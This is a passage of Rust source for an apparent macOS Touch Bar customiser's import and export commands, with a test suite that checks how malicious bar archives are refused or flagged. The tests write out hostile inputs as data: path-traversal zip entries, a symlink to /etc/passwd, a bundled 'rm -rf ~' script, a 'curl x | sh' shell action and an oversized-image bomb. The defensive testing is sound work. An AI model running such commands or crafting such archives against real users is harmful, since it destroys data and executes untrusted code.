        let copie = icones::importer_en_png(Path::new(source), &dossier).map_err(|e| fr_seul(format!("logo refusé, {e}")))?;
        copies.push((source.clone(), icones::avec_tilde(&copie)));
    }
    chaque_image(&mut barre, &mut |i| {
        if let Some((_, c)) = copies.iter().find(|(s, _)| s == i) {
            *i = c.clone();
        }
    });
    let json = serde_json::to_value(&barre).map_err(|e| fr_seul(format!("barre illisible : {e}")))?;
    super::enregistrer(config, json).map_err(fr_seul)
}

// ---------- Ligne de commande ----------

/// `tactile --exporter <fichier>` : la barre de `config::chemin()` (ou la barre par défaut s'il n'existe pas).
pub fn exporter_cli(cible: &Path, fr: bool) -> i32 {
    let chemin = config::chemin();
    let (barre, original) = if chemin.exists() {
        match config::verifier(&chemin) {
            Ok(b) => (b, std::fs::read_to_string(&chemin).ok()),
            Err(e) => {
                eprintln!("{e}");
                return 1;
            }
        }
    } else {
        (config::lire(include_str!("../../exemples/barre.toml")).expect("exemple invalide"), None)
    };
    match exporter(&barre, original.as_deref(), cible) {
        Ok(export) => {
            for a in &export.avis {
                eprintln!("{} {}", attention(a, fr), a.dans(fr));
            }
            let logos = match (export.logos, fr) {
                (0, _) => String::new(),
                (n, true) => format!(", avec {}", config::nombre(n, "logo")),
                (n, false) => format!(", with {n} logo{}", if n > 1 { "s" } else { "" }),
            };
            println!("{} {}{logos}", if fr { "OK : barre exportée dans" } else { "OK: bar exported to" }, export.fichier.display());
            0
        }
        Err(e) => {
            eprintln!("tactile : {}", e.dans(fr));
            1
        }
    }
}

/// `tactile --importer <fichier> [--oui]` : résumé, liste de ce que la barre peut lancer, confirmation, installation.
pub fn importer_cli(fichier: &Path, oui: bool, fr: bool) -> i32 {
    use std::io::IsTerminal;
    let paquet = match ouvrir(fichier) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("tactile : {}", e.dans(fr));
            return 1;
        }
    };
    println!("{}", resume(&paquet, fichier, fr));
    // Un secret du trousseau envoyé ailleurs : un « o » tapé par réflexe ne suffit pas, il faut --oui écrit exprès.
    if !paquet.alertes().is_empty() {
        if !oui {
            eprintln!("{}", if fr { "tactile : cette barre envoie un mot de passe de ton trousseau hors de ce Mac. Rien n'a changé ; relance avec --oui seulement si tu fais confiance à son auteur." } else { "tactile: this bar sends a password from your keychain off this Mac. Nothing changed; run again with --yes only if you trust its author." });
            return 1;
        }
        eprintln!("{}", if fr { "attention : --oui donné, la barre est installée malgré l'alerte ci-dessus." } else { "warning: --yes given, the bar is installed despite the warning above." });
    }
    if !oui {
        if !std::io::stdin().is_terminal() {
            eprintln!("{}", if fr { "tactile : pas de terminal pour confirmer ; relance avec --oui pour remplacer ta barre." } else { "tactile: no terminal to confirm; run again with --yes to replace your bar." });
            return 1;
        }
        print!("{}", if fr { "Remplacer ma barre ? La barre actuelle restera dans l'historique. [o/N] " } else { "Replace my bar? The current bar stays in the history. [y/N] " });
        let _ = std::io::stdout().flush();
        let mut reponse = String::new();
        let _ = std::io::stdin().read_line(&mut reponse);
        if !["o", "oui", "y", "yes"].contains(&reponse.trim().to_lowercase().as_str()) {
            println!("{}", if fr { "Rien n'a changé." } else { "Nothing changed." });
            return 1;
        }
    }
    let chemin = config::chemin();
    match installer(&paquet, &chemin) {
        Ok(_) => {
            let ancienne = super::version(&chemin, 1);
            let garde = if ancienne.exists() { ancienne.display().to_string() } else { String::new() };
            match (fr, garde.is_empty()) {
                (true, true) => println!("OK : barre installée dans {}.", chemin.display()),
                (true, false) => println!("OK : barre installée dans {}. L'ancienne est gardée dans {garde}.", chemin.display()),
                (false, true) => println!("OK: bar installed in {}.", chemin.display()),
                (false, false) => println!("OK: bar installed in {}. The old one is kept in {garde}.", chemin.display()),
            }
            0
        }
        Err(e) => {
            eprintln!("tactile : {}", e.dans(fr));
            1
        }
    }
}

/// Le préfixe d'un avis dans la langue de sa phrase : un avis de `config` n'existe qu'en français, il garde « attention : ».
fn attention(avis: &Texte, fr: bool) -> &'static str {
    if fr || avis.fr == avis.en { "attention :" } else { "warning:" }
}

/// Résumé lisible d'une barre à importer : éléments, barres d'application, logos, ce qu'elle lance, avis.
fn resume(paquet: &Paquet, fichier: &Path, fr: bool) -> String {
    let b = &paquet.barre;
    let mut lignes = Vec::new();
    let apps: Vec<&str> = b.applications.iter().map(|a| a.app.as_str()).collect();
    if fr {
        let mut l = format!("Barre de {} : {}", fichier.display(), config::nombre(b.elements.len(), "élément"));
        if !apps.is_empty() {
            l += &format!(", {} d'application ({})", config::nombre(apps.len(), "barre"), apps.join(", "));
        }
        if paquet.logos() > 0 {
            l += &format!(", {}", config::nombre(paquet.logos(), "logo"));
        }
        lignes.push(l + ".");
    } else {
        let mut l = format!("Bar from {}: {} item{}", fichier.display(), b.elements.len(), if b.elements.len() > 1 { "s" } else { "" });
        if !apps.is_empty() {
            l += &format!(", {} app bar{} ({})", apps.len(), if apps.len() > 1 { "s" } else { "" }, apps.join(", "));
        }
        if paquet.logos() > 0 {
            l += &format!(", {} logo{}", paquet.logos(), if paquet.logos() > 1 { "s" } else { "" });
        }
        lignes.push(l + ".");
    }
    lignes.extend(paquet.alertes().iter().map(|a| a.dans(fr).to_string()));
    if paquet.commandes.is_empty() {
        lignes.push(if fr { "Elle ne lance aucune commande." } else { "It runs no commands." }.into());
    } else {
        lignes.push(if fr { "Ce que cette barre fait sur ton Mac :" } else { "What this bar does on your Mac:" }.into());
        for c in &paquet.commandes {
            lignes.push(format!("  {} · {}{} {}", c.ou.dans(fr), c.quoi.dans(fr), if fr { " :" } else { ":" }, c.valeur));
        }
    }
    for a in &paquet.avis {
        lignes.push(format!("{} {}", attention(a, fr), a.dans(fr)));
    }
    lignes.join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    const ICNS: &str = "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/GenericApplicationIcon.icns";

    fn dossier_essai(nom: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("tactile-partage-{nom}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// Une archive faite à la main : (nom, contenu), plus un lien symbolique éventuel.
    fn archive(chemin: &Path, entrees: &[(&str, &[u8])], lien: Option<&str>) {
        let mut zip = zip::ZipWriter::new(std::fs::File::create(chemin).unwrap());
        let options = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
        for (nom, contenu) in entrees {
            zip.start_file(*nom, options).unwrap();
            zip.write_all(contenu).unwrap();
        }
        if let Some(nom) = lien {
            zip.add_symlink(nom, "/etc/passwd", options).unwrap();
        }
        zip.finish().unwrap();
    }

    const SIMPLE: &[u8] = b"[[element]]\ntype = \"bouton\"\ntexte = \"Salut\"\naction = { url = \"https://example.com\" }\n";

    #[test]
    fn aller_retour_toml_simple() {
        let d = dossier_essai("toml");
        let sans_image = config::lire(include_str!("../../exemples/par-application.toml")).unwrap();
        assert_eq!(logos(&sans_image), 0);
        // Sans extension : .toml, puisqu'il n'y a pas de logo.
        let export = exporter(&sans_image, None, &d.join("partage")).unwrap();
        assert_eq!(export.fichier, d.join("partage.toml"));
        assert!(export.avis.is_empty());
        let paquet = ouvrir(&export.fichier).unwrap();
        assert_eq!(paquet.barre, sans_image);
        let cible = d.join("ailleurs/barre.toml");
        installer(&paquet, &cible).unwrap();
        assert_eq!(config::lire(&std::fs::read_to_string(&cible).unwrap()).unwrap(), sans_image);
        // Un second import : la barre d'avant passe dans l'historique.
        installer(&ouvrir(&export.fichier).unwrap(), &cible).unwrap();
        assert!(super::super::version(&cible, 1).exists());
        // Le texte d'origine (commentaires compris) est recopié tel quel.
        let original = "# à moi\n[[element]]\ntype = \"souple\"\n";
        let export = exporter(&config::lire(original).unwrap(), Some(original), &d.join("brut.toml")).unwrap();
        assert_eq!(std::fs::read_to_string(export.fichier).unwrap(), original);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    #[cfg_attr(ci, ignore = "AppKit rendering into a bitmap context: no graphics session on a CI runner")]
    fn aller_retour_zip_avec_deux_logos() {
        let d = dossier_essai("zip");
        // Deux logos dans icones/ de la config d'origine, comme l'éditeur les copie.
        let origine = d.join("origine/barre.toml");
        let un = icones::importer_en_png(Path::new(ICNS), &icones::dossier(&origine)).unwrap();
        let svg = d.join("rond.svg");
        std::fs::write(&svg, r##"<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100"><rect width="200" height="100" fill="#A259FF"/></svg>"##).unwrap();
        let deux = icones::importer(&svg, &icones::dossier(&origine)).unwrap();
        let barre = config::lire(&format!(
            "[[element]]\ntype = \"bouton\"\nimage = \"{}\"\naction = {{ shell = \"make\" }}\n\n[[element]]\ntype = \"souple\"\n\n\
             [[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"bouton\"\nimage = \"{}\"\ngabarit = true\n",
            un.display(),
            deux.display()
        ))
        .unwrap();
        assert_eq!(logos(&barre), 2);
        // Un .toml demandé avec des logos : écrit, mais avec un avertissement.
        assert_eq!(exporter(&barre, None, &d.join("a.toml")).unwrap().avis.len(), 1);
        let export = exporter(&barre, None, &d.join("partage")).unwrap();
        assert_eq!((export.fichier.clone(), export.logos), (d.join("partage.zip"), 2));
        // Dans l'archive : barre.toml aux chemins relatifs, et les deux images seulement.
        let mut zip = zip::ZipArchive::new(std::fs::File::open(&export.fichier).unwrap()).unwrap();
        let mut noms: Vec<String> = zip.file_names().map(|n| n.unwrap().into_owned()).collect();
        noms.sort();
        let attendus = [format!("icones/{}", un.file_name().unwrap().to_string_lossy()), format!("icones/{}", deux.file_name().unwrap().to_string_lossy())];
        assert_eq!(noms, [vec!["barre.toml".to_string()], attendus.to_vec()].concat());
        let mut toml = String::new();
        zip.by_name("barre.toml").unwrap().read_to_string(&mut toml).unwrap();
        assert!(toml.contains(&format!("image = \"{}\"", attendus[0])), "{toml}");

        let paquet = ouvrir(&export.fichier).unwrap();
        assert_eq!(paquet.logos(), 2);
        assert_eq!(paquet.commandes.len(), 1);
        let cible = d.join("cible/barre.toml");
        installer(&paquet, &cible).unwrap();
        let installee = config::lire(&std::fs::read_to_string(&cible).unwrap()).unwrap();
        // La même barre, ses images dans icones/ de la cible (même nom d'origine ; le hachage est celui du contenu reçu).
        let mut attendue = barre.clone();
        let nom = |i: &str| icones::sans_hachage(&Path::new(i).file_stem().unwrap().to_string_lossy()).to_string();
        chaque_image(&mut attendue, &mut |i| *i = nom(i));
        let mut comparee = installee.clone();
        chaque_image(&mut comparee, &mut |i| {
            assert_eq!(Path::new(i).parent().unwrap(), icones::dossier(&cible));
            *i = nom(i);
        });
        assert_eq!(comparee, attendue);
        for i in images(&installee) {
            assert!(Path::new(&i).is_file(), "{i}");
            assert_eq!(&std::fs::read(&i).unwrap()[1..4], b"PNG");
        }
        let temporaire = paquet.temporaire.clone().unwrap();
        drop(paquet);
        assert!(!temporaire.exists(), "le dossier temporaire part avec le paquet");
        std::fs::remove_dir_all(&d).unwrap();
    }

    /// Un logo qui annonce 30000 × 30000 px dans son en-tête : l'archive est refusée à l'ouverture, avant tout aperçu.
    #[test]
    fn image_geante_refusee_a_l_import() {
        let d = dossier_essai("geante");
        let z = d.join("geante.zip");
        let toml = b"[[element]]\ntype = \"bouton\"\nimage = \"icones/geante.png\"\n";
        archive(&z, &[("barre.toml", toml), ("icones/geante.png", &crate::barre::png_annonce(30000, 30000))], None);
        let avant = crate::barre::memoire_max();
        let refus = ouvrir(&z).map(|_| ()).unwrap_err();
        assert_eq!(refus.fr, "logo « icones/geante.png » refusé, image trop grande : 30000 × 30000 px, maximum 4096");
        assert_eq!(refus.en, "logo “icones/geante.png” refused, image too large: 30000 × 30000 px, at most 4096");
        assert!(crate::barre::memoire_max() - avant < 64 << 20);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn archives_malveillantes_refusees() {
        let d = dossier_essai("malveillant");
        let essai = |nom: &str, entrees: &[(&str, &[u8])], lien: Option<&str>| {
            let z = d.join(nom);
            archive(&z, entrees, lien);
            ouvrir(&z)
        };
        let refus = |r: Result<Paquet, Texte>| r.map(|_| ()).unwrap_err().fr;
        assert!(refus(essai("remonte.zip", &[("barre.toml", SIMPLE), ("../x", b"x")], None)).contains("sort de son dossier"));
        assert!(refus(essai("remonte2.zip", &[("barre.toml", SIMPLE), ("icones/../../x.png", b"x")], None)).contains("sort de son dossier"));
        assert!(refus(essai("absolu.zip", &[("barre.toml", SIMPLE), ("/tmp/x", b"x")], None)).contains("sort de son dossier"));
        assert!(refus(essai("lien.zip", &[("barre.toml", SIMPLE)], Some("icones/x.png"))).contains("lien symbolique"));
        assert!(refus(essai("image-lourde.zip", &[("barre.toml", SIMPLE), ("icones/x.png", &vec![0u8; 3 * 1024 * 1024])], None)).contains("2 Mo"));
        assert!(refus(essai("sans-barre.zip", &[("icones/x.png", b"x")], None)).contains("barre.toml"));
        let trop: Vec<(String, Vec<u8>)> = (0..=FICHIERS_MAX).map(|k| (format!("f{k}.txt"), vec![])).collect();
        let trop: Vec<(&str, &[u8])> = trop.iter().map(|(n, c)| (n.as_str(), c.as_slice())).collect();
        assert!(refus(essai("nombreux.zip", &trop, None)).contains("trop de fichiers"));
        // 11 Mo : refusé avant même d'être lu, quel que soit son contenu.
        let gros = d.join("gros.zip");
        std::fs::write(&gros, vec![b'P'; 11 * 1024 * 1024]).unwrap();
        assert!(refus(ouvrir(&gros)).contains("10 Mo"));
        assert!(refus(ouvrir_octets(vec![0; 11 * 1024 * 1024], None)).contains("10 Mo"));
        // Un fichier inattendu est ignoré, et dit.
        let paquet = essai("inattendu.zip", &[("barre.toml", SIMPLE), ("notes.txt", b"x"), ("scripts/x.sh", b"rm -rf ~")], None).unwrap();
        assert_eq!(paquet.barre, config::lire(std::str::from_utf8(SIMPLE).unwrap()).unwrap());
        assert!(paquet.avis.iter().any(|a| a.fr.contains("notes.txt") && a.fr.contains("scripts/x.sh")), "{:?}", paquet.avis);
        // Une barre invalide ou trop lourde.
        assert!(refus(essai("invalide.zip", &[("barre.toml", b"[[element]]\ntype = \"truc\"\n")], None)).contains("truc"));
        assert!(refus(ouvrir_octets(vec![b'#'; 1024 * 1024 + 1], None)).contains("1 Mo"));
        assert!(entree_dangereuse("C:/x") && entree_dangereuse("\\x") && entree_dangereuse("a\\..\\b") && !entree_dangereuse("icones/a..b.png"));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn ce_que_la_barre_lance() {
        let barre = config::lire(
            "[[element]]\ntype = \"bouton\"\ntexte = \"Build\"\naction = { shell = \"make build\" }\nappui_long = { applescript = \"beep\" }\n\n\
             [[element]]\ntype = \"bouton\"\naction = { url = \"https://example.com\" }\n\n\
             [[element]]\ntype = \"bouton\"\naction = { url = \"file:///Applications\" }\n\n\
             [[element]]\ntype = \"bouton\"\naction = \"lecture_pause\"\n\n\
             [[element]]\ntype = \"script\"\ncommande = \"date\"\nintervalle = 60\naction = { app = \"Calendar\" }\n\n\
             [[element]]\ntype = \"groupe\"\n  [[element.element]]\n  type = \"bouton\"\n  action = { touche = \"cmd+shift+4\" }\n  [[element.element]]\n  type = \"bouton\"\n  action = { keycode = 53 }\n\n\
             [[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"bouton\"\naction = { shell = \"open -a Mail\" }\n",
        )
        .unwrap();
        let liste: Vec<(String, String, String)> = commandes(&barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect();
        let attendu = [
            ("Barre principale, élément 1 « Build »", "Commande shell", "make build"),
            ("Barre principale, élément 1 « Build »", "AppleScript (appui long)", "beep"),
            ("Barre principale, élément 3", "Ouvre l’adresse", "file:///Applications"),
            ("Barre principale, élément 5", "Commande relancée toutes les 60 s", "date"),
            ("Barre principale, élément 5", "Ouvre l’app", "Calendar"),
            ("Barre principale, élément 6 › 1", "Raccourci clavier", "cmd+shift+4"),
            ("Barre principale, élément 6 › 2", "Touche simulée", "keycode 53"),
            ("Barre de « Safari »", "Commande shell", "open -a Mail"),
        ]
        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
        assert_eq!(liste[..7], attendu[..7]);
        assert_eq!(liste[7], ("Barre de « Safari », élément 1".into(), "Commande shell".into(), "open -a Mail".into()));
        assert_eq!(liste.len(), 8);
        assert_eq!(commandes(&barre)[0].ou.en, "Main bar, item 1 “Build”");
        // Un [[site]] est listé (il lit l'adresse de l'onglet actif), même sans élément qui lance quoi que ce soit, puis ses éléments.
        let barre = config::lire("[[element]]\ntype = \"souple\"\n\n[[site]]\nadresse = \"youtube.com\"\n[[site.element]]\ntype = \"bouton\"\naction = { touche = \"k\" }\n").unwrap();
        let liste: Vec<(String, String, String)> = commandes(&barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect();
        assert_eq!(liste[0], ("Barre du site « youtube.com »".into(), "Change la barre sur youtube.com ; lit l’adresse de l’onglet actif de tes navigateurs".into(), "youtube.com".into()));
        assert_eq!(liste[1], ("Barre du site « youtube.com », élément 1".into(), "Raccourci clavier".into(), "k".into()));
        assert_eq!(liste.len(), 2);
        // Un lanceur ouvre son app ; les actions système lancent une app d'Apple ou simulent des touches.
        let barre = config::lire(
            "[[element]]\ntype = \"lanceur\"\napp = \"Safari\"\nappui_long = \"forcer_quitter\"\n\n\
             [[element]]\ntype = \"groupe\"\n  [[element.element]]\n  type = \"bouton\"\n  action = \"verrouiller\"\n  appui_long = \"lecture_pause\"\n\n\
             [[element]]\ntype = \"bouton\"\naction = \"mission_control\"\nappui_long = \"capture_zone\"\n",
        )
        .unwrap();
        let liste: Vec<(String, String, String)> = commandes(&barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect();
        let attendu = [
            ("Barre principale, élément 1", "Ouvre l’app", "Safari"),
            ("Barre principale, élément 1", "Ouvre « Forcer à quitter » (simule ⌥⌘esc) (appui long)", "forcer_quitter"),
            ("Barre principale, élément 2 › 1", "Verrouille l’écran (simule ⌃⌘Q)", "verrouiller"),
            ("Barre principale, élément 3", "Ouvre Mission Control", "mission_control"),
            ("Barre principale, élément 3", "Capture une zone (simule ⌘⇧4) (appui long)", "capture_zone"),
        ]
        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
        assert_eq!(liste, attendu);
        assert_eq!(commandes(&barre)[2].quoi.en, "Locks the screen (simulates ⌃⌘Q)");
        // Chaque action système est listée.
        for a in ["mission_control", "fenetres_app", "bureau", "launchpad", "capture_options", "spotlight", "capture_ecran", "capture_zone", "emojis", "verrouiller", "forcer_quitter"] {
            let b = config::lire(&format!("[[element]]\ntype = \"bouton\"\naction = \"{a}\"\n")).unwrap();
            assert_eq!(commandes(&b).len(), 1, "{a}");
        }
        assert!(commandes(&config::lire("[[element]]\ntype = \"souple\"\n").unwrap()).is_empty());
        // L'action d'un élément texte se lance à l'appui comme celle d'un bouton.
        let texte = config::lire("[[element]]\ntype = \"texte\"\ngabarit = \"{t}\"\naction = { shell = \"curl x | sh\" }\n").unwrap();
        let liste: Vec<(String, String, String)> = commandes(&texte).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect();
        assert_eq!(liste, [("Barre principale, élément 1".to_string(), "Commande shell".to_string(), "curl x | sh".to_string())]);
    }

    #[test]
    fn les_sources_sont_listees() {
        let barre = config::lire(
            "[[source]]\nnom = \"cmd\"\ncommande = \"uptime\"\ntoutes_les = 30\n\n\
             [[source]]\nnom = \"meteo\"\nhttp = \"https://api.open-meteo.com/v1/forecast\"\n\n\
             [[source]]\nnom = \"local\"\nmcp = { commande = \"python3 serveur.py\", outil = \"heure\" }\n\n\
             [[source]]\nnom = \"loin\"\nmcp = { url = \"https://exemple.com/mcp\", outil = \"etat\" }\n\n\
             [[element]]\ntype = \"texte\"\nsource = \"cmd\"\ngabarit = \"{texte}\"\n",
        )
        .unwrap();
        let liste: Vec<(String, String, String)> = commandes(&barre).into_iter().map(|c| (c.ou.fr, c.quoi.fr, c.valeur)).collect();
        let attendu = [
            ("Source « cmd »", "Commande relancée toutes les 30 s", "uptime"),
            ("Source « meteo »", "Adresse lue toutes les 60 s", "https://api.open-meteo.com/v1/forecast"),
            ("Source « local »", "Serveur MCP lancé (outil « heure »)", "python3 serveur.py"),
            ("Source « loin »", "Serveur MCP distant appelé (outil « etat »)", "https://exemple.com/mcp"),
        ]
        .map(|(a, b, c)| (a.to_string(), b.to_string(), c.to_string()));
        assert_eq!(liste, attendu);
        let en: Vec<(String, String)> = commandes(&barre).into_iter().map(|c| (c.ou.en, c.quoi.en)).collect();
        assert_eq!(en[1], ("“meteo” source".into(), "Address fetched every 60 s".into()));
        assert_eq!(en[2].1, "MCP server started (tool “heure”)");
        assert_eq!(en[3].1, "Remote MCP server called (tool “etat”)");
    }

    #[test]
    fn un_toml_seul_prend_ses_icones_voisines() {
        let d = dossier_essai("voisines");
        std::fs::create_dir_all(d.join("icones")).unwrap();
        std::fs::write(d.join("icones/x.png"), b"pas lu ici").unwrap();
        std::fs::write(d.join("barre.toml"), "[[element]]\ntype = \"bouton\"\nimage = \"icones/x.png\"\n").unwrap();
        let paquet = ouvrir(&d.join("barre.toml")).unwrap();
        assert_eq!(paquet.logos(), 1);
        // Un lien symbolique à la place de l'image : refusé.
        std::fs::remove_file(d.join("icones/x.png")).unwrap();
        std::os::unix::fs::symlink("/etc/hosts", d.join("icones/x.png")).unwrap();
        assert!(ouvrir(&d.join("barre.toml")).unwrap_err().fr.contains("lien symbolique"));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn destination_selon_les_logos() {
        assert_eq!(destination(Path::new("/x/barre"), 0), Path::new("/x/barre.toml"));
        assert_eq!(destination(Path::new("/x/barre"), 2), Path::new("/x/barre.zip"));
        assert_eq!(destination(Path::new("/x/b.TOML"), 2), Path::new("/x/b.TOML"));
        assert_eq!(destination(Path::new("/x/b.zip"), 0), Path::new("/x/b.zip"));
    }

    /// L'export en .zip sans rendu AppKit : deux logos de même nom venus de deux dossiers, un logo utilisé deux fois,
    /// un logo introuvable ; les chemins de la barre sont réécrits partout (groupe, barre d'application), puis relus à l'import.
    #[test]
    fn export_zip_reecrit_chaque_chemin() {
        let d = dossier_essai("reecrit");
        for (dossier, l) in [("a", 1), ("b", 2)] {
            std::fs::create_dir_all(d.join(dossier)).unwrap();
            std::fs::write(d.join(dossier).join("logo.png"), crate::barre::png_annonce(l, l)).unwrap();
        }
        let (a, b) = (d.join("a/logo.png"), d.join("b/logo.png"));
        let barre = config::lire(&format!(
            "[[element]]\ntype = \"bouton\"\nimage = \"{a}\"\n\n[[element]]\ntype = \"groupe\"\n  [[element.element]]\n  type = \"bouton\"\n  image = \"{b}\"\n  [[element.element]]\n  type = \"bouton\"\n  image = \"{a}\"\n\n\
             [[element]]\ntype = \"bouton\"\nimage = \"/nexiste/pas.png\"\n\n[[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"bouton\"\nimage = \"{b}\"\n",
            a = a.display(),
            b = b.display()
        ))
        .unwrap();
        assert_eq!(logos(&barre), 3);
        let export = exporter(&barre, None, &d.join("partage")).unwrap();
        assert_eq!((export.fichier.clone(), export.logos), (d.join("partage.zip"), 2));
        assert_eq!(export.avis.len(), 1);
        assert!(export.avis[0].fr.contains("/nexiste/pas.png") && export.avis[0].en.contains("not found"), "{:?}", export.avis);

        let mut zip = zip::ZipArchive::new(std::fs::File::open(&export.fichier).unwrap()).unwrap();
        let noms: Vec<String> = zip.file_names().map(|n| n.unwrap().into_owned()).collect();
        assert_eq!(noms, ["barre.toml", "icones/logo.png", "icones/logo-2.png"]);
        let mut texte = String::new();
        zip.by_name("barre.toml").unwrap().read_to_string(&mut texte).unwrap();
        let dans_le_zip = config::lire(&texte).unwrap();
        assert_eq!(images(&dans_le_zip), ["icones/logo.png", "icones/logo-2.png", "/nexiste/pas.png"]);
        let mut contenu = Vec::new();
        zip.by_name("icones/logo-2.png").unwrap().read_to_end(&mut contenu).unwrap();
        assert_eq!(contenu, std::fs::read(&b).unwrap(), "la seconde image garde son contenu sous le nom suffixé");

        let paquet = ouvrir(&export.fichier).unwrap();
        // Le résumé dit « 2 logos » (l'archive en a deux), pas le nombre de boutons qui les affichent.
        assert_eq!(paquet.logos(), 2, "quatre emplacements, deux fichiers");
        assert!(resume(&paquet, &export.fichier, true).contains(", 2 logos."));
        let temporaire = paquet.temporaire.clone().unwrap();
        for source in &paquet.sources {
            assert!(Path::new(source).starts_with(&temporaire) && Path::new(source).is_file(), "{source}");
        }
        // Rien d'autre n'a bougé : même barre, aux chemins d'image près ; l'image restée hors de l'archive est retirée.
        let mut sans_images = paquet.barre.clone();
        chaque_image(&mut sans_images, &mut |i| *i = Path::new(i).file_name().unwrap().to_string_lossy().into_owned());
        let mut attendue = dans_le_zip.clone();
        chaque_image(&mut attendue, &mut |i| *i = Path::new(i).file_name().unwrap().to_string_lossy().into_owned());
        attendue.elements[2] = config::lire("[[element]]\ntype = \"bouton\"\nsymbole = \"photo\"\n").unwrap().elements.remove(0);
        assert_eq!(sans_images, attendue);
        assert!(paquet.avis.iter().any(|a| a.fr == "image ignorée : chemin hors de la barre importée (/nexiste/pas.png)"), "{:?}", paquet.avis);
        drop(paquet);
        assert!(!temporaire.exists());
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn imports_refuses_ou_signales() {
        let d = dossier_essai("refus");
        let refus = |r: Result<Paquet, Texte>| r.map(|_| ()).unwrap_err();
        let zip = |nom: &str, entrees: &[(&str, &[u8])]| {
            let z = d.join(nom);
            archive(&z, entrees, None);
            ouvrir(&z)
        };
        assert!(refus(ouvrir(&d)).fr.ends_with("n'est pas un fichier"));
        assert!(refus(ouvrir(&d.join("absent.zip"))).fr.starts_with("impossible de lire"));
        assert_eq!(refus(ouvrir_octets(vec![0xFF, 0xFE, 0], None)).en, "this file is neither a .toml nor a .zip");
        // Deux entrées au même nom (le crate refuse de l'écrire : le nom de la seconde est changé dans les octets). Le
        // lecteur n'en garderait qu'une, peut-être pas celle qu'un autre outil montre : toute l'archive est refusée.
        let png = crate::barre::png_annonce(1, 1);
        for (nom, autre) in [("barre.toml", "barre.tomX"), ("icones/a.png", "icones/a.pnX")] {
            let entrees: &[(&str, &[u8])] = if nom == "barre.toml" { &[("barre.toml", SIMPLE), (autre, SIMPLE)] } else { &[("barre.toml", SIMPLE), (nom, &png), (autre, &png)] };
            archive(&d.join("deux.zip"), entrees, None);
            let mut octets = std::fs::read(d.join("deux.zip")).unwrap();
            while let Some(i) = octets.windows(autre.len()).position(|w| w == autre.as_bytes()) {
                octets[i + autre.len() - 1] = *nom.as_bytes().last().unwrap();
            }
            assert_eq!(refus(ouvrir_octets(octets, None)).fr, "archive refusée : deux entrées portent le même nom", "{nom}");
        }
        assert!(refus(zip("binaire.zip", &[("barre.toml", &[0xFF, 0xFE])])).fr.contains("UTF-8"));
        assert!(refus(zip("rangee.zip", &[("dossier/barre.toml", SIMPLE)])).fr.contains("à sa racine"));
        assert!(refus(ouvrir_octets(b"PK\x03\x04tronque".to_vec(), None)).fr.starts_with("archive illisible"));
        // Une barre principale vide (avis grave de `controler`) ou une couleur invalide dans une barre d'application.
        assert!(refus(ouvrir_octets(b"[[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"souple\"\n".to_vec(), None)).fr.contains("vide"));
        let couleur = b"[[element]]\ntype = \"souple\"\n[[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"bouton\"\ncouleur = \"bleu\"\n";
        assert!(refus(ouvrir_octets(couleur.to_vec(), None)).fr.starts_with("application « Safari », élément 1"));
        // Un logo cité mais absent de l'archive : importé quand même, et dit.
        let paquet = zip("absent.zip", &[("barre.toml", b"[[element]]\ntype = \"bouton\"\ntexte = \"x\"\nimage = \"icones/absent.png\"\n")]).unwrap();
        assert!(paquet.avis.iter().any(|a| a.fr == "logo absent du fichier importé : icones/absent.png"), "{:?}", paquet.avis);
        assert_eq!(paquet.logos(), 0);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn noms_d_icone_acceptes() {
        assert_eq!(nom_d_icone("icones/x.png"), Some("x.png"));
        assert_eq!(nom_d_icone("icones/Logo Final.SVG"), Some("Logo Final.SVG"));
        for refuse in ["icones/", "icones/.x.png", "icones/a/b.png", "icones/a\\b.png", "icones/x.exe", "icones/x", "x.png", "Icones/x.png", "icones/x\0.png"] {
            assert_eq!(nom_d_icone(refuse), None, "{refuse}");
        }
        assert_eq!(nom_d_icone(&format!("icones/{}.png", "a".repeat(252))), None, "plus de 255 octets");
    }

    /// Lise (0.3) : « warning: ligne 47 » renvoyait à un fichier que la personne qui importe ne voit pas, en
    /// mêlant un préfixe anglais à une phrase française.
    #[test]
    fn avis_d_un_zip_situes_par_element_dans_une_seule_langue() {
        let d = dossier_essai("avis-situes");
        let toml = b"# en-tete\n\n[[element]]\ntype = \"souple\"\n[[element]]\ntype = \"souple\"\n\
              [[element]]\ntype = \"texte\"\nsource = \"absente\"\n\
              [[application]]\napp = \"Safari\"\n[[application.element]]\ntype = \"lanceur\"\napp = \"AppQuiNexistePasDuTout\"\n\
              [[element]]\ntype = \"souple\"\n";
        archive(&d.join("b.zip"), &[("barre.toml", toml)], None);
        let paquet = ouvrir(&d.join("b.zip")).unwrap();
        let avis: Vec<&str> = paquet.avis.iter().map(|a| a.fr.as_str()).collect();
        assert!(avis.iter().all(|a| !a.contains("ligne")), "{avis:?}");
        assert!(avis.iter().any(|a| a.starts_with("élément 3 : aucune [[source]] ne s'appelle « absente »")), "{avis:?}");
        assert!(avis.iter().any(|a| a.starts_with("application « Safari », élément 1 : app « AppQuiNexistePasDuTout » introuvable")), "{avis:?}");
